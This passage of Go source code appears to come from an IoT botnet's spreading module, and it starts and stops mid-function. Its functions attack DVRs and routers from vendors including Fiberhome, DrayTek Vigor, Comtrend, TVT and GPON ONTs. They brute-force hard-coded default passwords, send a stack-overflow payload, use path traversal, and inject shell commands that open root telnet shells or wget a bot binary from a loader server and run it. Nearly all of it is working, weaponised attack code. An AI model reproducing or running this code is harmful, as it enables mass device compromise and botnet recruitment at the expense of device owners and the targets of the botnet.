		    	return 0, nil, "", 0
		    }
	    } else if strings.Contains(string(second_buf), "admin$") {
	    	gotAdmin = 1
	    } else {
	    	conn.Close()
	    	return 0, nil, "", 0
	    }
   	}

   	if gotAdmin == 1  || gotShell == 1 {
   		conn.Write([]byte("shell\n"))
	   	conn.Write([]byte("/bin/busybox BOXOFABOX\n"))

	   	new_buf := make([]byte, 128)
	    l, err := conn.Read(new_buf)
	    if err != nil || l <= 0 {
	        conn.Close()
	        return 0, nil, "", 0
	    }

	    if strings.Contains(string(new_buf), "BOXOFABOX: applet not found") {
		   	conn.Write([]byte("/bin/busybox telnetd -p" + strconv.Itoa(rInt) + " -l/bin/sh\n"))
		    conn.Write([]byte("exit\n"))
		    conn.Write([]byte("quit\n"))
	   		conn.Close()

	   		time.Sleep(3 * time.Second)
	   		return 1, nil, password, rInt
	    } else {
		    conn.Write([]byte("exit\n"))
		    conn.Write([]byte("quit\n"))
	        conn.Close()
	        return 0, nil, "", 0
	    }
   	} else {
   		conn.Write([]byte("quit\n"))
   		conn.Close()
   		return 0, nil, "", 0
   	}
}

func infectFunctionLibdvr(target string) {

	splitStr := strings.Split(target, ":")
   	for i := 0; i < 3; i++ {
	    exploited, err, _, port := infectFunctionLibdvrProto(target, i)
	    if err != nil {
	        return
	    }

	    if exploited == 1 {
	    	fmt.Printf("\x1b[38;5;46mLibdvr\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m potential telnet shell\x1b[38;5;15m\r\n", target)
	    	telnetLoader(splitStr[0] + ":" + strconv.Itoa(port), 0, "arm7", loaderLibdvrTag)
	        return
	    }
	}
}

func infectFunctionDvrip(target string) {

	var (
		bytebuf []byte = []byte("")
		adminPasswords []string = []string{"tlJwpbo6", "S2fGqNFs", "OxhlwSG8", "ORsEWe7l", "nTBCS19C"}
		username string = "admin"
		password string = ""
		attempt int = 0
		authed int = 0
	)

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
		return
    }

    for
	{
		if attempt >= 5 {
			break
		} else {
			password = adminPasswords[attempt]
		}

		conn.Write([]byte("\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x64\x00\x00\x00{ \"EncryptType\" : \"MD5\", \"LoginType\" : \"DVRIP-Web\", \"PassWord\" : \"" + password + "\", \"UserName\" : \"" + username + "\" }\x0a"))

		for {
	        tmpbuf := make([]byte, 128)
	        ln, err := conn.Read(tmpbuf)
	        if ln <= 0 || err != nil {
	            break
	        }

	        bytebuf = append(bytebuf, tmpbuf...)
	        if strings.Contains(string(bytebuf), "}") {
	        	break
	        }
	    }

		dvrret, err := strconv.Atoi(getStringInBetween(string(bytebuf), "\"Ret\" : ", ", \"SessionID"))
		if err != nil {
			authed = 0
			break
	    }

		if dvrret == DVRIP_OK {
			authed = 1
		}

		dvrret = DVRIP_NORESP

		if authed == 1 {
			break
		}
			
		attempt++
		continue
	}

	if authed != 1 {
		conn.Close()
		return
	}

	conn.Write([]byte("\xff\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xee\x03\x35\x00\x00\x00{ \"Name\" : \"KeepAlive\", \"SessionID\" : \"0x00000004\" }\x0a"))
	zeroByte(bytebuf)

	for {
	    tmpbuf := make([]byte, 128)
	    ln, err := conn.Read(tmpbuf)
	    if ln <= 0 || err != nil {
	        conn.Close()
	        return
	    }

	    bytebuf = append(bytebuf, tmpbuf...)
	    if strings.Contains(string(bytebuf), "}") {
	        break
	    }
	}

	zeroByte(bytebuf)
	conn.Write([]byte("\xff\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x05\x73\x00\x00\x00{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x00000004\" }\x0a"))

	for {
	    tmpbuf := make([]byte, 128)
	    ln, err := conn.Read(tmpbuf)
	    if ln <= 0 || err != nil {
	        conn.Close()
	        return
	    }

	    bytebuf = append(bytebuf, tmpbuf...)
	    if strings.Contains(string(bytebuf), "}") {
	        break
	    }
	}

	zeroByte(bytebuf)
	conn.Write([]byte("\xff\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf2\x05\x62\x01\x00\x00\x50\x4B\x03\x04\x14\x03\x00\x00\x08\x00\x2C\x87\x1A\x4F\x9A\xF8\xB3\x9E\xC6\x00\x00\x00\x23\x02\x00\x00\x0B\x00\x00\x00\x49\x6E\x73\x74\x61\x6C\x6C\x44\x65\x73\x63\xB5\x90\x3D\x0B\xC2\x30\x10\x86\x77\x7F\xC5\x91\xD9\x62\x15\x1C\x74\xAD\x88\xAE\x56\x5D\xC4\x21\x35\x87\x0D\xC6\xE4\x48\xE2\x47\x91\xFE\x77\xDB\x14\x11\xAB\x8B\x88\x37\x64\x79\xDE\x7B\x2E\x77\xB7\x0E\x00\x5B\xD1\xDE\x72\x81\x89\x39\x1E\xB9\x16\x6C\x0C\x9B\x0E\x54\x55\xB1\x50\xEC\x09\x58\x9A\xA3\x52\xAC\xFB\x20\xE9\xCE\x4A\xF2\x35\xF0\xA8\x34\x7A\x01\x11\xC1\x28\x8E\xFB\x10\x29\xE8\x65\x52\xF7\x5C\xCE\x42\xB8\xEC\x7E\xEF\xCC\x4E\xAE\xC8\xCC\x15\xFE\xE1\x76\x0A\x91\x60\x30\x1C\x0D\xE2\xF8\xF7\x1F\x7E\xB0\x55\xEF\xB6\xEE\x60\x33\x6E\xC5\x85\x5B\x0C\xA2\x83\xA4\x24\xC7\xDD\x81\x05\x94\x9E\x88\x8C\xF5\x53\xC5\x5D\xBE\x2C\x08\xDF\x4F\x1F\xD0\x7C\xF2\xD2\xDB\x1E\x30\xC1\x73\x48\xB4\xED\x6B\xD4\xC2\xD8\x36\x68\x36\x23\xEE\x65\xA6\x70\x8D\xD6\x49\xA3\xAB\x4C\xD4\x6F\xD0\x22\x69\xCD\x2A\xEF\x50\x4B\x01\x02\x3F\x03\x14\x03\x00\x00\x08\x00\x2C\x87\x1A\x4F\x9A\xF8\xB3\x9E\xC6\x00\x00\x00\x23\x02\x00\x00\x0B\x00\x24\x00\x00\x00\x00\x00\x00\x00\x20\x80\xA4\x81\x00\x00\x00\x00\x49\x6E\x73\x74\x61\x6C\x6C\x44\x65\x73\x63\x0A\x00\x20\x00\x00\x00\x00\x00\x01\x00\x18\x00\x00\xCA\x6F\xF3\x26\x5C\xD5\x01\x00\x40\x5B\x5C\x2F\x5C\xD5\x01\x80\xD6\xF3\x5C\x2F\x5C\xD5\x01\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x5D\x00\x00\x00\xEF\x00\x00\x00\x00\x00"))
	
	for {
	    tmpbuf := make([]byte, 128)
	    ln, err := conn.Read(tmpbuf)
	    if ln <= 0 || err != nil {
	        conn.Close()
	        return
	    }

	    bytebuf = append(bytebuf, tmpbuf...)
	    if strings.Contains(string(bytebuf), "}") {
	        break
	    }
	}

	zeroByte(bytebuf)
	conn.Write([]byte("\xff\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x01\xf2\x05\x00\x00\x00\x00"))

	splitStr := strings.Split(target, ":")
	time.Sleep(10 * time.Second)

    fmt.Printf("\x1b[38;5;46mDvrip\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m potential telnet shell opened\x1b[38;5;15m\r\n", target)
    go telnetLoader(splitStr[0] + ":9001", 0, "arm7", loaderDvripTag)

	conn.Write([]byte("\xFF\x01\x00\x00\x57\x00\x00\x00\x00\x00\x00\x00\x00\x00\xEA\x03\x27\x00\x00\x00{ \"Name\" : \"\", \"SessionID\" : \"0x00000004\" }\x0a"))
	conn.Close()
	return
}

/* ------ END OF THE OTHER STUFF ------ */

func ucSofiaCheck(target string, pid string) (found int) {

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return -1
    }

    defer conn.Close()
    tmp := make([]byte, 256)
    buf := make([]byte, 0, 512)

    fmt.Fprintf(conn, "GET ../../proc/%s/cmdline HTTP\r\n\r\n", pid)
    for {
        n, err := conn.Read(tmp)
        if err != nil {
            break
        }

        buf = append(buf, tmp[:n]...)
    }

    if (strings.Contains(string(buf), "/var/Sofia") || strings.Contains(string(buf), "usr/bin/Sofia") || strings.Contains(string(buf), "system_sofia") || strings.Contains(string(buf), "/var/bin/system_sofia")) && !strings.Contains(string(buf), "dvrHelper") {
        return 1
    } else {
        return -1
    }
}

func ucGuessSmaps(target string, pid string) (found int) {

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return -1
    }

    defer conn.Close()
    tmp := make([]byte, 8096)
    buf := make([]byte, 0, 512)

    fmt.Fprintf(conn, "GET ../../proc/%s/smaps HTTP\r\n\r\n", pid)
    for {
        n, err := conn.Read(tmp)
        if err != nil {
            break
        }

        buf = append(buf, tmp[:n]...)
    }

    smapsLines := strings.Split(string(buf), "\n")
    smapsCount := 0
    gotRegion := 0
    regionsAdded := 0

    for i := 0; i < len(smapsLines); i++ {
        if !strings.Contains(string(smapsLines[i]), "rwxp") {
            continue
        }

        smapsCount++
    }

    smapsRegions := make([]*smapsRegion, smapsCount)
    for i := range smapsRegions {
        smapsRegions[i] = &smapsRegion{}
    }

    for i := 0; i < len(smapsLines); i++ {
        if gotRegion == 8 || gotRegion == 0 {
            if !strings.Contains(string(smapsLines[i]), "rwxp") {
                continue
            }

            region := strings.Split(string(smapsLines[i]), "-")
            smapsRegions[regionsAdded].region = hexToInt(region[0])

            for q := 0; q < len(region); q++ {
                region[q] = ""
            }

            gotRegion = 1
        } else {
            if gotRegion == 1 {
                startAt := 0
                endAt := 0

                for q := 0; q < len(smapsLines[i]); q++ {
                    if startAt == 0 {
                        if _, err := strconv.Atoi(smapsLines[i][q:q+1]); err == nil {
                            startAt = q
                            continue
                        }
                    }
                    if endAt == 0 && startAt > 0 {
                        if smapsLines[i][q:q+1] == " " {
                            endAt = q
                            continue
                        }
                    }
                }

                if startAt > 0 && endAt > 0 {
                    smapsRegions[regionsAdded].size, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
                    gotRegion = 2
                    continue
                }

            } else if gotRegion == 2 {
                startAt := 0
                endAt := 0

                for q := 0; q < len(smapsLines[i]); q++ {
                    if startAt == 0 {
                        if _, err := strconv.Atoi(smapsLines[i][q:q+1]); err == nil {
                            startAt = q
                            continue
                        }
                    }
                    if endAt == 0 && startAt > 0 {
                        if smapsLines[i][q:q+1] == " " {
                            endAt = q
                            continue
                        }
                    }
                }

                if startAt > 0 && endAt > 0 {
                    smapsRegions[regionsAdded].rss, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
                    gotRegion = 3
                    continue
                }
            } else if gotRegion == 3 {
                startAt := 0
                endAt := 0

                for q := 0; q < len(smapsLines[i]); q++ {
                    if startAt == 0 {
                        if _, err := strconv.Atoi(smapsLines[i][q:q+1]); err == nil {
                            startAt = q
                            continue
                        }
                    }
                    if endAt == 0 && startAt > 0 {
                        if smapsLines[i][q:q+1] == " " {
                            endAt = q
                            continue
                        }
                    }
                }

                if startAt > 0 && endAt > 0 {
                    smapsRegions[regionsAdded].pss, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
                    gotRegion = 4
                    continue
                }
            } else if gotRegion == 4 {
                startAt := 0
                endAt := 0

                for q := 0; q < len(smapsLines[i]); q++ {
                    if startAt == 0 {
                        if _, err := strconv.Atoi(smapsLines[i][q:q+1]); err == nil {
                            startAt = q
                            continue
                        }
                    }
                    if endAt == 0 && startAt > 0 {
                        if smapsLines[i][q:q+1] == " " {
                            endAt = q
                            continue
                        }
                    }
                }

                if startAt > 0 && endAt > 0 {
                    smapsRegions[regionsAdded].shared_clean, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
                    gotRegion = 5
                    continue
                }
            } else if gotRegion == 5 {
                startAt := 0
                endAt := 0

                for q := 0; q < len(smapsLines[i]); q++ {
                    if startAt == 0 {
                        if _, err := strconv.Atoi(smapsLines[i][q:q+1]); err == nil {
                            startAt = q
                            continue
                        }
                    }
                    if endAt == 0 && startAt > 0 {
                        if smapsLines[i][q:q+1] == " " {
                            endAt = q
                            continue
                        }
                    }
                }

                if startAt > 0 && endAt > 0 {
                    smapsRegions[regionsAdded].shared_ditry, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
                    gotRegion = 6
                    continue
                }
            } else if gotRegion == 6 {
                startAt := 0
                endAt := 0

                for q := 0; q < len(smapsLines[i]); q++ {
                    if startAt == 0 {
                        if _, err := strconv.Atoi(smapsLines[i][q:q+1]); err == nil {
                            startAt = q
                            continue
                        }
                    }
                    if endAt == 0 && startAt > 0 {
                        if smapsLines[i][q:q+1] == " " {
                            endAt = q
                            continue
                        }
                    }
                }

                if startAt > 0 && endAt > 0 {
                    smapsRegions[regionsAdded].private_clean, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
                    gotRegion = 7
                    continue
                }
            } else if gotRegion == 7 {
                startAt := 0
                endAt := 0

                for q := 0; q < len(smapsLines[i]); q++ {
                    if startAt == 0 {
                        if _, err := strconv.Atoi(smapsLines[i][q:q+1]); err == nil {
                            startAt = q
                            continue
                        }
                    }
                    if endAt == 0 && startAt > 0 {
                        if smapsLines[i][q:q+1] == " " {
                            endAt = q
                            continue
                        }
                    }
                }

                if startAt > 0 && endAt > 0 {
                    smapsRegions[regionsAdded].private_dirty, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
                    gotRegion = 8
                    regionsAdded++
                    continue
                }
            }

            gotRegion++
        }
    }

    for i := len(smapsRegions) - 7; i > 1; i-- {
        if smapsRegions[i].size == 8188 && smapsRegions[i + 1].size == 8188 && smapsRegions[i + 2].size == 8188 && smapsRegions[i + 3].size == 8188 && smapsRegions[i + 4].size == 8188 && smapsRegions[i + 5].size == 8188 && smapsRegions[i + 6].size == 8188 {
            if smapsRegions[i].rss == 4 && smapsRegions[i + 1].rss == 4 && smapsRegions[i + 2].rss == 4 && smapsRegions[i + 3].rss >= 8 && smapsRegions[i + 4].rss >= 4 && smapsRegions[i + 5].rss >= 4 && smapsRegions[i + 6].rss >= 8 {
                return int(smapsRegions[i + 3].region)
            }
        }
    }

    return 0
}

func ucSendBof(target string, offset int) {

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    defer conn.Close()

    v := uint32(offset)
    offsetBuf := make([]byte, 4)
    binary.LittleEndian.PutUint32(offsetBuf, v)

    conn.Write([]byte("GET "))
    conn.Write([]byte(uchttpdShellCode))

    for i := 0; i < 299 - len(uchttpdShellCode); i ++ {
        conn.Write([]byte("a"))
    }

    conn.Write([]byte(offsetBuf))
    conn.Write([]byte(" HTTP\r\n\r\n"))

    buf := make([]byte, 0, 512)
    tmp := make([]byte, 256)

    for {
        n, err := conn.Read(tmp)
        if err != nil {
            break
        }

        buf = append(buf, tmp[:n]...)
    }

    zeroByte(buf)
    zeroByte(tmp)
}

func infectFunctionUchttpd(target string) {

    var pidStrs[128] string
    var pidsFound int = 0

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    /* Dvrip check */
    go func() {
        ipslit := strings.Split(target, ":")
        tmpconn, err := net.DialTimeout("tcp", ipslit[0] + ":34567", 10 * time.Second)
        if err == nil {
        	tmpconn.Close()
        	infectFunctionDvrip(ipslit[0] + ":34567")
        }
    } ()
    /* ////////////// */

    /* Libdvr check */
    go func() {
        ipslit := strings.Split(target, ":")
        tmpconn, err := net.DialTimeout("tcp", ipslit[0] + ":9527", 10 * time.Second)
        if err == nil {
        	tmpconn.Close()
        	infectFunctionLibdvr(ipslit[0] + ":9527")
        }
    } ()
    /* ////////////// */

    tmp := make([]byte, 256)
    buf := make([]byte, 0, 512)

    fmt.Fprintf(conn, "GET ../../proc/ HTTP\r\n\r\n")
    for {
        n, err := conn.Read(tmp)
        if err != nil {
            break
        }

        buf = append(buf, tmp[:n]...)
    }

    if !strings.Contains(string(buf), "Index of /mnt/web/") {
        zeroByte(tmp)
        zeroByte(buf)
        conn.Close()
        time.Sleep(10 * time.Second)
        return
    }

    zeroByte(tmp)
    zeroByte(buf)

    conn.Close()
    conn, err = net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
    	time.Sleep(10 * time.Second)
        return
    }

    buf = make([]byte, 0, 8096)
    tmp = make([]byte, 256)

    fmt.Fprintf(conn, "GET ../../proc/ HTTP\r\n\r\n")
    for {
        n, err := conn.Read(tmp)
        if err != nil {
            break
        }

        buf = append(buf, tmp[:n]...)
    }

    pids := strings.Split(string(buf), "\n")
    for i := 0; i < len(pids); i++ {
        if i >= 128 {
            break
        }

        if len(pids[i]) < 38 {
            continue
        }

        if _, err := strconv.Atoi(pids[i][33:34]); err != nil {
            continue
        }

        pidstr := pids[i][33:38]
        if _, err := strconv.Atoi(pidstr[0:1]); err == nil {
            if _, err := strconv.Atoi(pidstr[1:2]); err == nil {
                if _, err := strconv.Atoi(pidstr[2:3]); err == nil {
                    if _, err := strconv.Atoi(pidstr[3:4]); err == nil {
                        if _, err := strconv.Atoi(pidstr[4:5]); err == nil {
                            if len(pidstr[0:]) >= 5 {
                                pidStrs[pidsFound] = pidstr[0:5]
                                pidsFound++
                                continue
                            }
                        } else {
                            if len(pidstr[0:]) >= 4 {
                                pidStrs[pidsFound] = pidstr[0:4]
                                pidsFound++
                                continue
                            }
                        }
                    } else {
                        if len(pidstr[0:]) >= 3 {
                            pidStrs[pidsFound] = pidstr[0:3]
                            pidsFound++
                            continue
                        }
                    }
                } else {
                    if len(pidstr[0:]) >= 2 {
                        pidStrs[pidsFound] = pidstr[0:2]
                        pidsFound++
                        continue
                    }
                }
            } else {
                if len(pidstr[0:]) >= 1 {
                    pidStrs[pidsFound] = pidstr[0:1]
                    pidsFound++
                    continue
                }
            }
        }

        pidstr = ""
    }

    zeroByte(buf)
    zeroByte(tmp)

    if pidsFound <= 5 {
        conn.Close()
        time.Sleep(10 * time.Second)
        return
    }

    conn.Close()

    for i := pidsFound; i > 1; i-- {
        retval := ucSofiaCheck(target, pidStrs[i])
        if retval == -1 {
            continue
        }

        retval = ucGuessSmaps(target, pidStrs[i])
        if retval == -1 {
            continue
        }

        stackOffset := retval + 0x7fd3d8 + 20
        ucSendBof(target, stackOffset)
        break
    }

    for i := 0; i < pidsFound; i++ {
        pidStrs[i] = ""
    }

    zeroByte(buf)
    zeroByte(tmp)
    time.Sleep(10 * time.Second)
    return
}

func infectFunctionTvt(target string) {

    var rdbuf []byte = []byte("")

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    /* TVT4567 check */
    go func() {
        ipslit := strings.Split(target, ":")
        tmpconn, err := net.DialTimeout("tcp", ipslit[0] + ":4567", 10 * time.Second)
        if err == nil {
            infectFunctionTvt4567(tmpconn)
        }

        return
    } ()
    /* ////////////// */

    payload := "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=\"filterTypeMode\">refuse</filterType><filterList type=\"list\"><itemType><addressType type=\"addressType\"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$("
    payload += tvtWebPayload
    payload += ")</ip></item></filterList></content></request>"

    cntlen := strconv.Itoa(len(payload))

    conn.Write([]byte("POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: " + cntlen + "\r\nAccept-Language: en-us\r\nHost: " + target + "\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n" + payload + "\r\n\r\n"))

    for {
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            break
        }

        rdbuf = append(rdbuf, tmpbuf...)
        if strings.Contains(string(rdbuf), "<status>success</status>") {
            fmt.Printf("\x1b[38;5;46mTvt\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
            payloadSent++
            break
        }
    }

    conn.Close()
    time.Sleep(10 * time.Second)
}

func infectFunctionFiberhome(target string) {

    var (
        rdbuf []byte = []byte("")
        authed int = 0
        telnetPort int = 0
    )

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    conn.Write([]byte("POST /goform/webLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 23\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/login_inter.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nUser=admin&Passwd=admin\r\n\r\n"))
    
    for {
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            break
        }

        rdbuf = append(rdbuf, tmpbuf...)
        if strings.Contains(string(rdbuf), "Set-Cookie: loginName=admin") {
            authed = 1
            break
        }
    }

    conn.Close()

    if authed == 0 {
        return
    }

    conn, err = net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    conn.Write([]byte("GET /menu_inter.asp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://" + target + "/login_inter.asp\r\nConnection: keep-alive\r\nCookie: loginName=admin\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
    
    for {
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            break
        }

        rdbuf = append(rdbuf, tmpbuf...)
    
        if strings.Contains(string(rdbuf), "Set-Cookie: loginName=admin") {
            authed = 1
            break
        }
    }

    conn.Close()

    if fiberRandPort == 1 {
        rand.Seed(time.Now().UnixNano())
        telnetPort = rand.Intn(50000) + 10000
    } else {
        telnetPort = fiberStaticPort
    }

    for i := 0; i < len(fiberSecStrs); i++ {
        conn, err = net.DialTimeout("tcp", target, 10 * time.Second)
        if err != nil {
            return
        }

        conn.Write([]byte("GET /goform/setPing?ping_ip=;telnetd%20-l/bin/sh%20-p" + strconv.Itoa(telnetPort) + "&requestNum=" + strconv.Itoa(i + 1) + "&diagtype=1&" + fiberSecStrs[i] + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept: */*\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCookie: loginName=admin\r\n\r\n"))
        
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            conn.Close()
            break
        }

        conn.Close()

        if !strings.Contains(string(rdbuf), "200 OK") {
            return
        }
    }

    time.Sleep(3 * time.Second)
    
    ipslit := strings.Split(target, ":")
    conn, err = net.DialTimeout("tcp", ipslit[0] + ":" + strconv.Itoa(telnetPort), 10 * time.Second)
    if err == nil {
        fmt.Printf("\x1b[38;5;46mFiberhome\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m telnet shell opened\x1b[38;5;15m\r\n", target)
        go telnetLoader(ipslit[0] + ":" + strconv.Itoa(telnetPort), 0, "mips", loaderFiberhomeTag)
        conn.Close()
    }

    return
}

func infectFunctionVigor(target string) {

    var rdbuf []byte = []byte("")

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    payload := "action=login&keyPath=%27%0A%09%2F"
    payload += vigorPayload
    payload += "%27%0A%09%27&loginPwd=a&loginUser=a"
    cntlen := strconv.Itoa(len(payload))

    conn.Write([]byte("POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nContent-Length: " + cntlen + "\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\r\n" + payload + "\r\n\r\n"))
    
    for {
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            break
        }

        rdbuf = append(rdbuf, tmpbuf...)
        if strings.Contains(string(rdbuf), "HTTP/1.1 200 OK") {
            fmt.Printf("\x1b[38;5;46mVigor\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
            payloadSent++
            break
        }
    }

    conn.Close()
}

func infectFunctionComtrend(target string) {

    var (
        rdbuf []byte = []byte("")
        state = 0
        sessionKey = "null"
    )

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    conn.Write([]byte("GET /pingview.cmd HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic cm9vdDoxMjM0NQ==\r\nConnection: close\r\nReferer: http://" + target + "/left.html\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
        
    for {
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            break
        }

        rdbuf = append(rdbuf, tmpbuf...)
        if strings.Contains(string(rdbuf), "&sessionKey=") && strings.Contains(string(rdbuf), "var code = 'location=") && state != 1 {
            sessionKey = getStringInBetween(string(rdbuf), "   loc += '&sessionKey=", "';\n}\n\nvar code = 'location=\"' + loc + '\"';\n")
            
            if sessionKey == "null" {
                break
            }

            conn.Close()
            conn, err = net.DialTimeout("tcp", target, 10 * time.Second)
            if err != nil {
                return
            }

            conn.Write([]byte("GET /ping.cgi?pingIpAddress=;cd%20/mnt;wget%20http://" + loaderDownloadServer + "/multi/wget.sh%20-O-%20>sfs;chmod%20777%20sfs;sh%20sfs%20" + loaderComtrendTag + ";&sessionKey=" + sessionKey + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic cm9vdDoxMjM0NQ==\r\nConnection: close\r\nReferer: http://" + target + "/ping.cgi\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
            state = 1
        } else if state == 1 {
            if strings.Contains(string(rdbuf), "function btnPing()") {
                fmt.Printf("\x1b[38;5;46mComtrend\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
                payloadSent++
                conn.Close()
                return
            }
        }
    }

    conn.Close()
}

func infectFunctionGponFiber(target string) {

    var (
        rdbuf []byte = []byte("")
        logins []string = []string{"user:user", "adminisp:adminisp", "admin:stdONU101"}
        stage = 0
    )

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    for i := 0; i < len(logins); i++ {
        loginSplit := strings.Split(logins[i], ":")

        conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
        if err != nil {
            return
        }

        cntlen := 14
        cntlen = len(loginSplit[0])
        cntlen = len(loginSplit[1])

        conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntlen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"))
        
        for {
            tmpbuf := make([]byte, 128)
            ln, err := conn.Read(tmpbuf)
            if ln <= 0 || err != nil {
                break
            }

            rdbuf = append(rdbuf, tmpbuf...)
            if strings.Contains(string(rdbuf), "ERROR:bad password!") {
                zeroByte(rdbuf)
                break
            } else if (strings.Contains(string(rdbuf), "HTTP/1.0 302 Moved Temporarily") || strings.Contains(string(rdbuf), "ERROR:you have logined!")) && stage != 1{
                conn.Close()
                conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
                if err != nil {
                    return
                }

                payload := "target_addr=%3Brm%20-rf%20/var/tmp/stainfo%3Bwget%20http://" + loaderDownloadServer +  loaderBinsLocation + "bot.mips%20-O%20->/var/tmp/stainfo%3Bchmod%20777%20/var/tmp/stainfo%3B/var/tmp/stainfo%20" + loaderGponfiberTag + "&waninf=1_INTERNET_R_VID_"
                cntlen := strconv.Itoa(len(payload))

